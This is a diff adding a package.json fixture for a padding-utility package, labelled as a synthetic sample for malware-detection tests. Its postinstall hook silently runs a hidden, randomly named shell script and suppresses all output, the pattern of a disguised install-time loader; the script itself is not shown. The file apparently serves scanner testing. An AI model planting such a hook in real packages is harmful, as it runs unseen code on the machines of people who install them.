@@ -1,0 +1,9 @@
+{
+  "_comment": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "name": "string-pad-utils",
+  "version": "2.3.1",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "sh ./.ci-k3p9qz.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+  }
+}
